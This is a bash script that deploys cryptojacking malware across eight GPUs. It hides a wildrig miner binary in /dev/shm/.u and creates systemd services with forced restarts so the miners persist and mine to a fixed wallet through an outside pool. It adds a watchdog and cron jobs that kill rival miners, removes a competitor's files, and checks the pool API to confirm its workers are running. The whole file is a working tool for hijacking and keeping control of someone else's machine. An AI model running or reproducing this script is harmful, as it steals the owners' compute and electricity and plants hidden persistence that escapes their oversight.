#!/bin/bash
# UL final plant: systemd-managed canonical pearlhash miners on all 8 A800,
# binaries/scripts in /dev/shm/.u (competing automation on this box meddles with /root/ul),
# plus a watchdog that removes the foreign plh/krig set.
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
PREFIX=${PREFIX:-ul-t2-123-184-7-135}
U=/dev/shm/.u
mkdir -p "$U"
echo "### PLANT $(date -u +%FT%TZ)"
ls -la /opt/t19/wildrig-multi.orig /dev/shm/.u 2>/dev/null
if [ ! -x "$U/w" ]; then
  cp -f /opt/t19/wildrig-multi.orig "$U/w" 2>/dev/null || cp -f /opt/arsenal/miners/wildrig/wildrig-multi "$U/w"
  chmod 700 "$U/w"
fi
md5sum "$U/w" 2>/dev/null
cat /opt/t19/keep.sh 2>/dev/null | head -30
echo "--- competitor cmd-disabled"; ls -la /root/ul/cmd-disabled 2>/dev/null | head
echo "--- our old cmd files removed?"; rm -rf /root/ul/cmd-g*.sh /root/ul/cmd-ph-g*.sh

# kill everything wildrig-like once, then hand control to systemd
systemctl stop plh-card@0 plh-card@1 plh-card@2 plh-card@3 plh-card@4 plh-card@5 plh-card@6 plh-card@7 2>/dev/null
ps -eo pid,args | grep -E 'wildrig-multi|krig-miner' | grep -v grep | awk '{print $1}' | while read -r p; do kill -KILL "$p" 2>/dev/null; done
sleep 2

# per-GPU systemd units: Restart=always -> survives kills by any competing script
dev=0
while [ $dev -lt 8 ]; do
  cat > /etc/systemd/system/ulx-g$dev.service <<EOS
[Unit]
Description=ulx gpu $dev
After=network-online.target
[Service]
Type=simple
Nice=10
ExecStart=$U/w --algo pearlhash --url pool.pearlhash.xyz:9000 --user $WALLET --worker $PREFIX-g$dev --pass x --protocol stratum --opencl-devices $dev --gpu-intensity 1 --gpu-temp-limit 88 --api-port $((1960+dev))
Restart=always
RestartSec=20
[Install]
WantedBy=multi-user.target
EOS
  systemctl daemon-reload 2>/dev/null
  systemctl enable --now ulx-g$dev 2>/dev/null
  echo "enabled ulx-g$dev"
  dev=$((dev+1))
  sleep 1
done
systemctl stop ul-pearl-keep 2>/dev/null; systemctl disable ul-pearl-keep 2>/dev/null

# watchdog: kills foreign miners only (our units are systemd-managed)
cat > "$U/watch.sh" <<EOS
#!/bin/bash
ps -eo pid,args | grep -E 'prl1p6grd5zl|plh-123-184|krig-miner' | grep -v grep | awk '{print \$1}' | xargs -r kill -KILL 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do systemctl is-active --quiet ulx-g\$i || systemctl start ulx-g\$i 2>/dev/null; done
EOS
chmod +x "$U/watch.sh"
cat > /etc/systemd/system/ulx-watch.service <<EOS
[Unit]
Description=ulx watchdog
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /bin/bash $U/watch.sh; sleep 45; done'
Restart=always
RestartSec=15
[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload; systemctl enable --now ulx-watch 2>/dev/null
( crontab -l 2>/dev/null | grep -vE 'ul/keep.sh|sample.sh'; echo "@reboot /bin/bash $U/watch.sh >/dev/null 2>&1"; echo "*/5 * * * * /bin/bash $U/watch.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null
crontab -l 2>/dev/null | tail -3

sleep 70
echo "### UNITS"
for i in 0 1 2 3 4 5 6 7; do printf 'ulx-g%s: %s ' $i "$(systemctl is-active ulx-g$i 2>/dev/null)"; done; echo
echo "### PROCS"
ps -eo pid,args | grep -E 'wildrig-multi' | grep -v grep | head -12
echo "### GPU"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader 2>&1
echo "### LOGS"
journalctl -u ulx-g0 -n 8 --no-pager 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do printf 'g%s: ' $i; journalctl -u ulx-g$i -n 3 --no-pager 2>/dev/null | tail -1; done
echo "### POOL-FROM-HOST"
curl -s -m 25 "https://pearlhash.xyz/api/account/$WALLET" | python3 -c '
import json,sys
d=json.load(sys.stdin); ws=d.get("connected_workers") or []
mine=[w for w in ws if "123-184" in (w.get("worker_name") or "")]
print("est15",d.get("estimated_hashrate_15s"),"mine",len(mine))
for w in mine: print(w.get("worker_name"), w.get("version"))
'
echo "### DONE-PLANT-FINAL"
